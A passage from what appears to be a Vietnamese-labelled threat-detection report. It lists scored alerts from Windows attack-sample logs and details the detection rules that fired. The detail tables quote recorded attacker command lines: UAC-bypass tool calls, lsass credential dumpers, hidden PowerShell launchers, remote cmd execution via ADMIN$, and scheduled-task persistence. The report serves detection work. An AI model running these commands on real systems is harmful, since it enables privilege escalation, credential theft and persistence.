| A0213 | medium | MSEDGEWIN10 | 2019-08-23 11:17:00 | 0s | 1 | execution |  | 0.98 |
| A0214 | medium | IEWIN7 | 2019-05-24 15:38:21 | 0s | 1 | defense-evasion | powershell.exe (1) | 0.98 |
| A0215 | medium | MSEDGEWIN10 | 2020-06-30 20:50:25 | 0s | 1 | defense-evasion | za3bollo.exe (1) | 0.98 |
| A0216 | medium | MSEDGEWIN10 | 2019-08-05 09:24:56 | 7s | 3 | discovery | net1.exe (3) | 0.98 |
| A0217 | medium | 01566s-win16-ir.threebeesco.com | 2023-01-24 11:52:02 | 0s | 1 | discovery | net1.exe (1) | 0.98 |
| A0218 | medium | MSEDGEWIN10 | 2020-07-09 21:49:03 | 49s | 4 | lateral-movement |  | 0.98 |
| A0219 | medium | MSEDGEWIN10 | 2020-07-09 21:55:18 | 46s | 4 | lateral-movement |  | 0.98 |
| A0220 | medium | MSEDGEWIN10 | 2020-07-09 21:28:47 | 37s | 3 | lateral-movement |  | 0.98 |
| A0221 | medium | MSEDGEWIN10 | 2020-07-09 19:47:00 | 0s | 1 | lateral-movement |  | 0.98 |
| A0222 | medium | MSEDGEWIN10 | 2020-07-09 20:06:31 | 0s | 1 | lateral-movement |  | 0.98 |
| A0223 | medium | MSEDGEWIN10 | 2020-07-09 20:43:29 | 0s | 1 | lateral-movement |  | 0.98 |
| A0224 | medium | MSEDGEWIN10 | 2020-07-09 21:07:05 | 0s | 1 | lateral-movement |  | 0.98 |
| A0225 | medium | MSEDGEWIN10 | 2020-07-09 21:30:53 | 0s | 1 | lateral-movement |  | 0.98 |
| A0226 | medium | 01566s-win16-ir.threebeesco.com | 2020-09-15 19:31:04 | 0s | 1 | privilege-escalation |  | 0.97 |
| A0227 | medium | IEWIN7 | 2019-05-14 00:32:19 | 15s | 2 | lateral-movement | explorer.exe (2) | 0.97 |
| A0228 | medium | IEWIN7 | 2019-05-14 00:29:48 | 0s | 1 | lateral-movement | explorer.exe (1) | 0.97 |
| A0229 | medium | 2016dc.hqcorp.local | 2017-06-09 19:21:26 | 0s | 1 | credential-access |  | 0.97 |
| A0230 | medium | PC01.example.corp | 2019-01-30 00:00:50 | 10s | 3 | command-and-control |  | 0.97 |
| A0231 | medium | PC01.example.corp | 2019-02-02 22:39:00 | 73s | 3 | command-and-control |  | 0.97 |
| A0232 | medium | PC01.example.corp | 2019-02-13 12:23:42 | 12s | 3 | command-and-control |  | 0.97 |
| A0233 | medium | PC01.example.corp | 2019-02-13 17:50:15 | 64s | 3 | command-and-control |  | 0.97 |
| A0234 | medium | PC01.example.corp | 2019-01-29 22:59:37 | 33s | 2 | command-and-control |  | 0.97 |
| A0235 | medium | PC01.example.corp | 2019-01-29 23:16:28 | 11s | 2 | command-and-control |  | 0.97 |
| A0236 | medium | PC01.example.corp | 2019-01-29 23:57:54 | 11s | 2 | command-and-control |  | 0.97 |
| A0237 | medium | PC01.example.corp | 2019-02-02 22:44:33 | 22s | 2 | command-and-control |  | 0.97 |
| A0238 | medium | MSEDGEWIN10 | 2020-10-20 22:33:02 | 24s | 3 | defense-evasion | wermgr.exe (2) | 0.97 |
| A0239 | medium | WIN-77LTAPHIQ1R.example.corp | 2019-01-20 07:02:45 | 0s | 6 | discovery |  | 0.97 |
| A0240 | medium | MSEDGEWIN10 | 2020-01-23 19:09:33 | 0s | 3 | execution | sharprdp.exe (3) | 0.97 |
| A0241 | medium | LAPTOP-JU4M3I0E | 2020-07-24 17:20:29 | 0s | 1 | credential-access | frida-winjector-helper-32.exe (1) | 0.97 |
| A0242 | medium | PC01.example.corp | 2019-02-16 10:05:21 | 40s | 6 | discovery | system (5) | 0.97 |
| A0243 | medium | MSEDGEWIN10 | 2019-09-03 11:33:22 | 0s | 1 | discovery | system (1) | 0.97 |
| A0244 | medium | MSEDGEWIN10 | 2019-09-03 11:34:35 | 0s | 1 | discovery | system (1) | 0.97 |
| A0245 | medium | PC02.example.corp | 2019-02-13 15:19:51 | 0s | 1 | command-and-control | winlogon.exe (1) | 0.97 |
| A0246 | medium | PC02.example.corp | 2019-02-13 15:29:40 | 0s | 1 | command-and-control | winlogon.exe (1) | 0.97 |
| A0247 | medium | IEWIN7 | 2019-05-28 02:13:52 | 58s | 6 | execution | vshadow.exe (2) | 0.96 |
| A0248 | medium | MSEDGEWIN10 | 2019-08-05 09:39:30 | 0s | 1 | privilege-escalation | svchost.exe (1) | 0.96 |
| A0249 | medium | DC1.insecurebank.local | 2019-05-16 14:17:15 | 0s | 3 | defense-evasion | reg.exe (3) | 0.96 |
| A0250 | medium | wind10.winlab.local | 2022-05-01 04:41:34 | 37s | 10 | privilege-escalation | - (4) | 0.95 |
| A0251 | medium | 01566s-win16-ir.threebeesco.com | 2023-01-24 11:53:14 | 89s | 4 | discovery | - (4) | 0.95 |
| A0252 | medium | MSEDGEWIN10 | 2020-10-20 22:35:26 | 0s | 1 | persistence | wmiprvse.exe (1) | 0.95 |
| A0253 | medium | PC01.example.corp | 2019-03-19 17:06:22 | 0s | 1 | persistence |  | 0.94 |
| A0254 | medium | IEWIN7 | 2018-11-06 21:45:34 | 16s | 3 | command-and-control |  | 0.93 |
| A0255 | medium | IEWIN7 | 2018-11-06 21:48:54 | 36s | 3 | command-and-control |  | 0.93 |
| A0256 | medium | PC01.example.corp | 2019-01-29 22:58:34 | 0s | 1 | command-and-control |  | 0.93 |
| A0257 | medium | PC01.example.corp | 2019-01-29 23:15:24 | 0s | 1 | command-and-control |  | 0.93 |
| A0258 | medium | PC01.example.corp | 2019-01-29 23:50:40 | 0s | 1 | command-and-control |  | 0.93 |
| A0259 | medium | PC01.example.corp | 2019-01-29 23:54:04 | 0s | 1 | command-and-control |  | 0.93 |
| A0260 | medium | PC01.example.corp | 2019-01-29 23:56:17 | 0s | 1 | command-and-control |  | 0.93 |
| A0261 | medium | PC01.example.corp | 2019-02-02 22:42:54 | 0s | 1 | command-and-control |  | 0.93 |
| A0262 | medium | PC01.example.corp | 2019-02-02 23:02:41 | 0s | 1 | command-and-control |  | 0.93 |
| A0263 | medium | wind10.winlab.local | 2022-05-01 04:40:18 | 0s | 1 | defense-evasion |  | 0.93 |
| A0264 | medium | DC1.insecurebank.local | 2019-03-25 12:37:49 | 1432s | 4 | privilege-escalation |  | 0.93 |
| A0265 | medium | MSEDGEWIN10 | 2021-03-15 18:33:51 | 41s | 3 | command-and-control |  | 0.92 |
| A0266 | medium | MSEDGEWIN10 | 2021-03-15 18:38:15 | 41s | 3 | command-and-control |  | 0.92 |
| A0267 | medium | DC1.insecurebank.local | 2019-05-14 17:42:52 | 10s | 4 | discovery | system (4) | 0.92 |
| A0268 | medium | MSEDGEWIN10 | 2021-03-15 17:56:57 | 41s | 3 | command-and-control |  | 0.92 |
| A0269 | medium | MSEDGEWIN10 | 2021-03-15 18:00:32 | 41s | 3 | command-and-control |  | 0.92 |
| A0270 | medium | MSEDGEWIN10 | 2019-08-30 23:16:28 | 0s | 1 | discovery | system (1) | 0.92 |
| A0271 | medium | MSEDGEWIN10 | 2019-08-23 12:37:37 | 1s | 2 | persistence |  | 0.92 |
| A0272 | medium | MSEDGEWIN10 | 2019-09-22 11:22:05 | 74s | 2 | persistence |  | 0.91 |
| A0273 | medium | MSEDGEWIN10 | 2019-08-14 14:06:44 | 0s | 2 | defense-evasion | proc_doppel64.exe (2) | 0.91 |
| A0274 | medium | MSEDGEWIN10 | 2020-07-04 14:31:26 | 0s | 3 | persistence | regedit.exe (3) | 0.91 |
| A0275 | medium | MSEDGEWIN10 | 2020-07-03 08:55:46 | 5s | 5 | execution |  | 0.90 |
| A0276 | medium | WIN-77LTAPHIQ1R.example.corp | 2019-03-03 09:24:24 | 0s | 1 | lateral-movement |  | 0.89 |
| A0277 | medium | MSEDGEWIN10 | 2021-03-15 18:54:14 | 37s | 4 | command-and-control → persistence → execution |  | 0.89 |
| A0278 | medium | WIN-77LTAPHIQ1R.example.corp | 2019-03-03 09:20:28 | 0s | 1 | lateral-movement |  | 0.88 |
| A0279 | medium | MSEDGEWIN10 | 2020-10-17 16:26:54 | 16s | 5 | execution → defense-evasion → lateral-movement | explorer.exe (1) | 0.88 |
| A0280 | medium | PC04.example.corp | 2019-03-17 19:26:42 | 228s | 2 | defense-evasion → lateral-movement |  | 0.88 |
| A0281 | medium | MSEDGEWIN10 | 2020-12-18 17:56:07 | 0s | 1 | persistence | lsass.exe (1) | 0.88 |
| A0282 | medium | MSEDGEWIN10 | 2021-03-15 18:43:41 | 0s | 2 | command-and-control |  | 0.87 |
| A0283 | medium | MSEDGEWIN10 | 2020-12-04 22:41:04 | 0s | 3 | lateral-movement → privilege-escalation → persistence | svchost.exe (2) | 0.87 |
| A0284 | medium | MSEDGEWIN10 | 2020-05-09 05:00:50 | 0s | 1 | privilege-escalation | system (1) | 0.87 |
| A0285 | medium | MSEDGEWIN10 | 2020-02-28 22:35:55 | 13s | 4 | lateral-movement |  | 0.86 |
| A0286 | medium | 02694w-win10.threebeesco.com | 2022-04-25 22:17:47 | 0s | 1 | privilege-escalation | - (1) | 0.86 |
| A0287 | medium | LAPTOP-JU4M3I0E | 2020-09-04 10:33:31 | 0s | 2 | persistence | lsass.exe (2) | 0.86 |
| A0288 | medium | DC1.insecurebank.local | 2019-05-16 01:33:54 | 0s | 1 | lateral-movement |  | 0.85 |
| A0289 | medium | 01566s-win16-ir.threebeesco.com | 2020-09-19 21:12:15 | 0s | 2 | credential-access | lsass.exe (2) | 0.85 |
| A0290 | medium | 01566s-win16-ir.threebeesco.com | 2020-09-19 21:14:32 | 0s | 2 | credential-access | lsass.exe (2) | 0.85 |
| A0291 | medium | MSEDGEWIN10 | 2020-02-11 11:05:36 | 0s | 1 | discovery |  | 0.85 |
| A0292 | medium | 01566s-win16-ir.threebeesco.com | 2020-09-02 11:47:39 | 9s | 3 | defense-evasion → privilege-escalation → lateral-movement | - (1) | 0.85 |
| A0293 | medium | 01566s-win16-ir.threebeesco.com | 2020-07-19 13:06:52 | 0s | 1 | lateral-movement |  | 0.85 |
| A0294 | medium | 01566s-win16-ir.threebeesco.com | 2020-09-15 19:29:51 | 0s | 2 | privilege-escalation | - (2) | 0.84 |
| A0295 | medium | MSEDGEWIN10 | 2020-03-09 21:17:15 | 0s | 1 | defense-evasion |  | 0.83 |
| A0296 | medium | MSEDGEWIN10 | 2020-03-09 21:22:56 | 0s | 1 | defense-evasion |  | 0.83 |
| A0297 | medium | MSEDGEWIN10 | 2020-03-09 22:17:17 | 0s | 1 | defense-evasion |  | 0.83 |
| A0298 | medium | MSEDGEWIN10 | 2020-03-09 22:54:06 | 0s | 1 | defense-evasion |  | 0.83 |
| A0299 | medium | MSEDGEWIN10 | 2020-03-10 01:01:24 | 0s | 1 | defense-evasion |  | 0.83 |
| A0300 | medium | MSEDGEWIN10 | 2020-03-10 06:09:32 | 0s | 1 | defense-evasion |  | 0.83 |
| A0301 | medium | PC02.example.corp | 2019-02-13 15:26:53 | 0s | 1 | command-and-control | winlogon.exe (1) | 0.82 |
| A0302 | medium | IEWIN7 | 2019-05-21 06:58:39 | 1s | 3 | execution | mshta.exe (3) | 0.81 |
| A0303 | medium | MSEDGEWIN10 | 2019-09-03 11:04:05 | 49s | 4 | privilege-escalation | w3wp.exe (2) | 0.81 |
| A0304 | medium | LAPTOP-JU4M3I0E | 2020-07-30 14:06:52 | 0s | 3 | privilege-escalation | svchost.exe (3) | 0.77 |
| A0305 | medium | IEWIN7 | 2019-05-13 14:50:01 | 57s | 3 | persistence |  | 0.75 |
| A0306 | medium | 01566s-win16-ir.threebeesco.com | 2020-09-15 19:28:17 | 32s | 3 | defense-evasion → persistence |  | 0.75 |
| A0307 | medium | ICORP-DC.internal.corp | 2019-02-02 09:16:52 | 35s | 4 | privilege-escalation |  | 0.60 |
| A0308 | medium | LAPTOP-JU4M3I0E | 2020-09-18 14:02:46 | 0s | 5 | credential-access |  | 0.57 |
| A0309 | low | IEWIN7 | 2019-05-12 12:52:43 | 0s | 1 | privilege-escalation |  | 0.80 |
| A0310 | low | IEWIN7 | 2019-05-12 18:04:50 | 0s | 2 | persistence |  | 0.79 |
| A0311 | low | 02694w-win10.threebeesco.com | 2020-10-06 21:40:30 | 12s | 2 | lateral-movement | lsass.exe (2) | 0.79 |
| A0312 | low | LAPTOP-JU4M3I0E | 2020-08-03 08:11:51 | 0s | 1 | lateral-movement |  | 0.78 |
| A0313 | low | MSEDGEWIN10 | 2020-05-13 00:28:16 | 0s | 1 | execution | cmd.exe (1) | 0.77 |
| A0314 | low | MSEDGEWIN10 | 2021-03-15 18:51:45 | 0s | 1 | persistence |  | 0.77 |
| A0315 | low | MSEDGEWIN10 | 2020-03-07 13:17:38 | 1s | 2 | privilege-escalation |  | 0.76 |
| A0316 | low | IEWIN7 | 2019-05-12 18:02:05 | 0s | 1 | persistence |  | 0.75 |
| A0317 | low | MSEDGEWIN10 | 2020-09-10 17:48:39 | 0s | 1 | persistence | cmd.exe (1) | 0.74 |
| A0318 | low | MSEDGEWIN10 | 2021-03-15 18:46:41 | 0s | 1 | command-and-control |  | 0.74 |
| A0319 | low | LAPTOP-JU4M3I0E | 2021-08-17 12:26:51 | 4s | 2 | credential-access |  | 0.73 |
| A0320 | low | 01566s-win16-ir.threebeesco.com | 2020-09-16 09:31:19 | 55s | 2 | defense-evasion |  | 0.69 |
| A0321 | low | 01566s-win16-ir.threebeesco.com | 2020-09-23 16:58:17 | 0s | 1 | defense-evasion |  | 0.67 |
| A0322 | low | DC1.insecurebank.local | 2019-05-14 17:31:27 | 0s | 1 | discovery | system (1) | 0.66 |
| A0323 | low | DC1.insecurebank.local | 2019-03-25 09:09:14 | 0s | 1 | defense-evasion |  | 0.65 |
| A0324 | low | MSEDGEWIN10 | 2020-07-10 02:19:35 | 0s | 1 | lateral-movement | svchost.exe (1) | 0.62 |
| A0325 | low | MSEDGEWIN10 | 2020-09-05 13:28:40 | 0s | 1 | defense-evasion | werfault.exe (1) | 0.54 |
| A0326 | low | MSEDGEWIN10 | 2020-09-05 13:33:34 | 0s | 1 | defense-evasion | werfault.exe (1) | 0.52 |

## Chi tiết

### A0001 · high · PC01.example.corp

- thời gian: 2019-03-19 20:35:25 → 21:41:17 UTC, 104 event, 55 process
- tactic: persistence (74); privilege-escalation (16); execution (10); command-and-control (3); credential-access (1)
- process: sdbinst.exe (47), osk.exe (21), ui0detect.exe (8), cmd.exe (4), slui.exe (3), rundll32.exe (3); user: SYSTEM, user01
- file log: Persistence/Persistence_Shime_Microsoft-Windows-Application-Experience_Program-Telemetry_500.json, Persistence/persistence_sysmon_11_13_1_shime_appfix.json
- **vì sao báo:**
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠
  - ghi file thực thi / script (`f_drop_exec`, 1 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 1 event)
  - khoá dùng để vượt UAC (`k_uac_bypass`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 20:58:20 | Sysmon 1 | sdbinst.exe | 1.00 | persistence | "C:\Windows\system32\sdbinst.exe" -q "C:\Users\user01\Desktop\titi.sdb"   |
| 20:42:38 | Sysmon 1 | cmd.exe | 1.00 | execution | "C:\Windows\System32\cmd.exe" /c msg *  "hello from run key" |
| 20:49:28 | Sysmon 1 | sdbinst.exe | 1.00 | persistence | "C:\Windows\system32\sdbinst.exe" -q -u "C:\Windows\AppPatch\Test.SDB  "   |
| 20:48:33 | Sysmon 1 | sdbinst.exe | 1.00 | persistence | "C:\Windows\system32\sdbinst.exe" -q -u "C:\Windows\AppPatch\Test.SDB  "   |
| 20:52:26 | Sysmon 1 | sdbinst.exe | 1.00 | persistence | "C:\Windows\system32\sdbinst.exe" -q -u "C:\Windows\AppPatch\Test.SDB  "   |

### A0002 · high · IEWIN7

- thời gian: 2019-05-11 16:46:10 → 18:10:42 UTC, 51 event, 35 process
- tactic: privilege-escalation (30); persistence (19); defense-evasion (2)
- process: python.exe (13), wusa.exe (6), wmic.exe (6), makecab.exe (4), cmd.exe (4), dllhost.exe (3); user: IEUser, IEWIN7$, SYSTEM
- file log: Persistence/sysmon_20_21_1_CommandLineEventConsumer.json, Privilege Escalation/security_4624_4673_token_manip.json, Privilege Escalation/sysmon_1_13_11_cmstp_ini_uacbypass.json, Privilege Escalation/sysmon_1_7_11_migwiz.json, Privilege Escalation/sysmon_1_7_11_sysprep_uacbypass.json
- **vì sao báo:**
  - WMI event subscription (persistence) (`f_wmi_sub`, 8 event) ⚠
  - đọc bộ nhớ process khác (`b_vm_read`, 3 event)
  - ghi file thực thi / script (`f_drop_exec`, 2 event)
  - nạp module không ký (`b_unsigned_module`, 2 event)
  - process con của dịch vụ thực thi từ xa (wsmprovhost, wmiprvse, DCOM) (`b_child_of_remote`, 2 event)
  - truy cập process lsass (`b_lsass_target`, 2 event) ⚠
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 16:46:10 | Sysmon 1 | python.exe | 1.00 | privilege-escalation | python  winpwnage.py -u uac -i 13 -p c:\Users\IEUser\Desktop\hellox86.dll |
| 17:10:10 | Security 4688 | python.exe | 1.00 | privilege-escalation |  |
| 16:54:02 | Sysmon 1 | python.exe | 1.00 | privilege-escalation | python  winpwnage.py -u uac -i 14 -p c:\Users\IEUser\Desktop\hellox86.dll |
| 18:10:42 | Sysmon 1 | python.exe | 1.00 | persistence | python  winpwnage.py -u elevate -i 1 -p c:\Windows\System32\cmd.exe |
| 17:57:49 | Sysmon 1 | python.exe | 1.00 | persistence | python  winpwnage.py -u elevate -5 -p c:\Windows\System32\cmd.exe |

### A0003 · high · PC01.example.corp

- thời gian: 2019-02-13 18:03:28 → 18:05:24 UTC, 47 event, 20 process
- tactic: discovery (23); privilege-escalation (14); command-and-control (7); lateral-movement (2); persistence (1)
- process: svchost.exe (20), plink.exe (4), system (3), winlogon.exe (3), - (2), smss.exe (2); user: PC01$, admin01, user01
- file log: Command and Control/DE_RDP_Tunnel_5156.json, Command and Control/DE_RDP_Tunneling_TerminalServices-RemoteConnectionManagerOperational_1149.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 4 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 18:03:28 | Security 4688 | plink.exe | 1.00 | privilege-escalation |  |
| 18:04:01 | Security 5156 | plink.exe | 1.00 | command-and-control |  |
| 18:04:45 | Security 5156 | plink.exe | 1.00 | command-and-control |  |
| 18:05:00 | Security 4688 | rundll32.exe | 1.00 | persistence |  |
| 18:05:06 | Security 4688 | rdpclip.exe | 0.99 | privilege-escalation |  |

### A0004 · high · PC04.example.corp

- thời gian: 2019-03-17 20:17:44 → 20:43:16 UTC, 26 event, 15 process
- tactic: defense-evasion (18); privilege-escalation (4); credential-access (2); lateral-movement (2)
- process: explorer.exe (6), rdpwinst.exe (4), keylogger_directx.exe (4), ui0detect.exe (3), icacls.exe (2), cmd.exe (1); user: IEUser
- file log: Credential Access/sysmon_13_keylogger_directx.json, Defense Evasion/sysmon_13_rdp_settings_tampering.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 9 event)
  - ghi file thực thi / script (`f_drop_exec`, 6 event)
  - khoá cấu hình service (`k_services`, 1 event)
  - can thiệp Defender / firewall (`f_av_tamper`, 1 event) ⚠

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 20:17:52 | Sysmon 1 | cmd.exe | 1.00 | defense-evasion | "C:\Windows\System32\cmd.exe" /C "C:\Users\IEUser\Desktop\RDPWrap-v1.6.2\install.bat"  |
| 20:17:52 | Sysmon 1 | rdpwinst.exe | 1.00 | defense-evasion | "C:\Users\IEUser\Desktop\RDPWrap-v1.6.2\RDPWInst"  -i -o |
| 20:18:09 | Sysmon 13 | rdpwinst.exe | 1.00 | defense-evasion |  |
| 20:20:17 | Sysmon 1 | takeown.exe | 1.00 | defense-evasion | "C:\Windows\System32\takeown.exe" /f  C:\Windows\System32\termsrv.dll |
| 20:18:05 | Sysmon 13 | rdpwinst.exe | 1.00 | defense-evasion |  |

### A0005 · high · IEWIN7

- thời gian: 2019-04-30 20:26:51 → 20:35:13 UTC, 24 event, 14 process
- tactic: lateral-movement (16); discovery (3); persistence (2); privilege-escalation (1); command-and-control (1); defense-evasion (1)
- process: cmd.exe (7), system (6), powershell.exe (4), services.exe (3), whoami.exe (2), mmc.exe (2); user: IEUser, SYSTEM
- file log: Lateral Movement/LM_impacket_docmexec_mmc_sysmon_01.json, Lateral Movement/LM_sysmon_psexec_smb_meterpreter.json, Lateral Movement/LM_wmiexec_impacket_sysmon_whoami.json
- **vì sao báo:**
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 4 event)
  - khoá cấu hình service (`k_services`, 3 event)
  - lệnh mã hoá base64 (`f_encoded`, 3 event)
  - PowerShell chạy ẩn / bỏ qua execution policy (`f_hidden_ps`, 3 event)
  - process con của dịch vụ thực thi từ xa (wsmprovhost, wmiprvse, DCOM) (`b_child_of_remote`, 3 event)
  - mở process với toàn quyền (`b_full_access`, 1 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 20:26:52 | Sysmon 1 | powershell.exe | 1.00 | lateral-movement | "powershell.exe" -noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Obj |
| 20:26:51 | Sysmon 1 | powershell.exe | 1.00 | lateral-movement | powershell.exe  -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:w |
| 20:35:12 | Sysmon 1 | cmd.exe | 1.00 | lateral-movement | "C:\Windows\System32\cmd.exe" /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1556656511.61 2>&1 |
| 20:35:13 | Sysmon 1 | cmd.exe | 1.00 | lateral-movement | "C:\Windows\System32\cmd.exe" /Q /c cd  1> \\127.0.0.1\ADMIN$\__1556656511.61 2>&1 |
| 20:35:13 | Sysmon 1 | cmd.exe | 1.00 | lateral-movement | "C:\Windows\System32\cmd.exe" /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__1556656511.61 2>&1 |

### A0006 · high · IEWIN7

- thời gian: 2019-04-27 15:57:25 → 15:57:54 UTC, 20 event, 5 process
- tactic: defense-evasion (13); persistence (6); execution (1)
- process: flash_update.exe (9), nvsmart.exe (8), cmd.exe (2), explorer.exe (1); user: IEUser
- file log: AutomatedTestingTools/Malware/DE_timestomp_and_dll_sideloading_and_RunPersist.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 17 event)
  - ghi file thực thi / script (`f_drop_exec`, 6 event)
  - nạp module không ký (`b_unsigned_module`, 1 event)
  - khoá Run / RunOnce (`k_run`, 1 event)
  - mở process với toàn quyền (`b_full_access`, 1 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 15:57:53 | Sysmon 1 | flash_update.exe | 1.00 | persistence | "C:\Users\IEUser\Downloads\Flash_update.exe"  |
| 15:57:53 | Sysmon 11 | flash_update.exe | 1.00 | persistence |  |
| 15:57:53 | Sysmon 2 | flash_update.exe | 1.00 | defense-evasion |  |
| 15:57:53 | Sysmon 11 | flash_update.exe | 1.00 | defense-evasion |  |
| 15:57:53 | Sysmon 2 | flash_update.exe | 1.00 | defense-evasion |  |

### A0007 · high · IEWIN7

- thời gian: 2019-05-27 15:12:38 → 15:12:59 UTC, 17 event, 17 process
- tactic: execution (17)
- process: cmd.exe (7), wmic.exe (4), whoami.exe (1), notepad.exe (1), vssadmin.exe (1), find.exe (1); user: SYSTEM
- file log: Execution/sysmon_exec_from_vss_persistence.json
- **vì sao báo:**
  - thao tác shadow copy (`f_shadow_copy`, 10 event) ⚠
  - thực thi trên máy khác (WMI, WinRM, PsExec, DCOM) (`f_remote_target`, 6 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 2 event)
  - tạo scheduled task (`f_schtask`, 2 event)
  - ghi file thực thi / script (`f_drop_exec`, 1 event)
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 1 event)
  - process con của dịch vụ thực thi từ xa (wsmprovhost, wmiprvse, DCOM) (`b_child_of_remote`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 15:12:54 | Sysmon 1 | svhost64.exe | 1.00 | execution | \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\\Windows\Temp\svhost64.exe |
| 15:12:59 | Sysmon 1 | cmd.exe | 1.00 | execution | cmd.exe /c %%SYSTEMROOT%%\system32\schtasks.exe /create /sc minute /mo 1 /tn "eyNQLDvUSuvVPg" /tr "\ |
| 15:12:59 | Sysmon 1 | schtasks.exe | 1.00 | execution | C:\Windows\system32\schtasks.exe  /create /sc minute /mo 1 /tn "eyNQLDvUSuvVPg" /tr "\\?\GLOBALROOT\ |
| 15:12:38 | Sysmon 1 | cmd.exe | 1.00 | execution | cmd.exe /c whoami /groups  |
| 15:12:47 | Sysmon 1 | cmd.exe | 1.00 | execution | cmd.exe /c %%SYSTEMROOT%%\system32\wbem\wmic.exe /output:C:\Windows\TEMP\YqOMAUgO /INTERACTIVE:off / |

### A0008 · high · IEWIN7

- thời gian: 2019-06-14 22:22:17 → 22:23:53 UTC, 16 event, 12 process
- tactic: persistence (11); execution (3); credential-access (1); privilege-escalation (1)
- process: a.exe (6), vbc.exe (2), dllhost.exe (2), bre6bge2jubb.exe (2), efsui.exe (1), explorer.exe (1); user: IEUser, SYSTEM
- file log: Persistence/sysmon_13_1_persistence_via_winlogon_shell.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 8 event)
  - ghi file thực thi / script (`f_drop_exec`, 1 event)
  - khoá Winlogon (`k_winlogon`, 1 event)
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 22:22:17 | Sysmon 1 | a.exe | 1.00 | persistence | "C:\Users\IEUser\Downloads\a.exe"  |
| 22:22:21 | Sysmon 11 | a.exe | 1.00 | persistence |  |
| 22:22:21 | Sysmon 13 | a.exe | 1.00 | persistence |  |
| 22:22:21 | Sysmon 1 | a.exe | 1.00 | persistence | "C:\Users\IEUser\Downloads\a.exe" |
| 22:22:52 | Sysmon 5 | a.exe | 1.00 | persistence |  |

### A0009 · high · alice.insecurebank.local

- thời gian: 2019-06-21 07:35:37 → 07:36:50 UTC, 15 event, 3 process
- tactic: credential-access (13); defense-evasion (2)
- process: rundll32.exe (7), outflank-dumpert.exe (4), andrewspecial.exe (4); user: Administrator
- file log: Credential Access/sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 8 event)
  - truy cập process lsass (`b_lsass_target`, 8 event) ⚠
  - mở process với toàn quyền (`b_full_access`, 8 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 8 event)
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 4 event) ⚠

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 07:35:50 | Sysmon 1 | rundll32.exe | 1.00 | defense-evasion | rundll32.exe  .\Outflank-Dumpert-DLL.dll, Dump |
| 07:35:37 | Sysmon 1 | outflank-dumpert.exe | 1.00 | defense-evasion | Outflank-Dumpert.exe |
| 07:36:50 | Sysmon 1 | andrewspecial.exe | 1.00 | credential-access | AndrewSpecial.exe |
| 07:36:50 | Sysmon 11 | andrewspecial.exe | 1.00 | credential-access |  |
| 07:35:37 | Sysmon 11 | outflank-dumpert.exe | 1.00 | credential-access |  |

### A0010 · high · IEWIN7

- thời gian: 2019-05-10 13:32:48 → 13:49:45 UTC, 12 event, 9 process
- tactic: privilege-escalation (11); execution (1)
- process: python.exe (4), cliconfg.exe (3), wusa.exe (2), cmd.exe (1), whoami.exe (1), makecab.exe (1); user: IEUser
- file log: Privilege Escalation/sysmon_11_1_7_uacbypass_cliconfg.json, Privilege Escalation/sysmon_13_1_compmgmtlauncherUACBypass.json
- **vì sao báo:**
  - khoá dùng để vượt UAC (`k_uac_bypass`, 1 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 1 event)
  - ghi file thực thi / script (`f_drop_exec`, 1 event)
  - nạp module không ký (`b_unsigned_module`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 13:32:48 | Sysmon 1 | python.exe | 1.00 | privilege-escalation | python  winpwnage.py -u uac -i 9 -p c:\Windows\System32\cmd.exe |
| 13:32:48 | Sysmon 13 | python.exe | 1.00 | privilege-escalation |  |
| 13:49:29 | Sysmon 1 | python.exe | 1.00 | privilege-escalation | python  winpwnage.py -u uac -i 11 -p c:\Users\IEUser\Desktop\hellox86.dll |
| 13:49:29 | Sysmon 11 | python.exe | 1.00 | privilege-escalation |  |
| 13:49:39 | Sysmon 1 | wusa.exe | 1.00 | privilege-escalation | "C:\Windows\System32\wusa.exe" c:\users\ieuser\appdata\local\temp\suspicious.cab /extract:C:\Windows |

### A0011 · high · IEWIN7

- thời gian: 2019-04-18 16:55:37 → 17:01:35 UTC, 11 event, 7 process
- tactic: privilege-escalation (8); credential-access (2); defense-evasion (1)
